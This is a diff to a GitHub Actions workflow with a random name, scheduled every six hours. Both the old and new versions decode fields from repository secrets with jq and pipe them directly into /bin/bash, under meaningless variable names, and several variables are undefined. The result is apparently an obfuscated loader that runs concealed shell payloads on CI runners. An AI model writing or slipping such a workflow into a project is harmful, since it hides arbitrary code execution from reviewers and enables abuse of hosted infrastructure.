@@ -3,25 +3,21 @@ name: corrosionsorrowful
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 5/6 * * *'
+    - cron: '29 0/6 * * *'
 
-jobs:  # 10387
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: corrosionsorrowful
         env:
-          y02: ${{ secrets.y02 }}
+          lpg76300: ${{ secrets.lpg76300 }}
         run: |
-          echo $y02 | jq -r .u512 | /bin/bash
-          echo $ciss217 | jq -r .h7 | /bin/bash
-          echo $vgebh5 | jq -r .ww719 | /bin/bash
-          echo $qezrl803 | jq -r .jyhaf88109 | /bin/bash
-          echo $egv616 | jq -r .mbqbk97213 | /bin/bash
-          echo $aqrbe8 | jq -r .uejsm575 | /bin/bash
-          echo $gwbh84 | jq -r .bfme47064 | /bin/bash
-          echo $w108 | jq -r .ivp276 | /bin/bash
-          echo $gtxl58787 | jq -r .goef5130 | /bin/bash
-          echo $y4 | jq -r .wu25665 | /bin/bash
+          echo $lpg76300 | jq -r .uv869 | /bin/bash
+          echo $mj675 | jq -r .ngi7709 | /bin/bash
+          echo $efyxt6 | jq -r .qdmzh83 | /bin/bash
+          echo $kqaw781 | jq -r .vbc094 | /bin/bash
+          echo $z5 | jq -r .dgdht3660 | /bin/bash
+          echo $csh740 | jq -r .o81 | /bin/bash
 
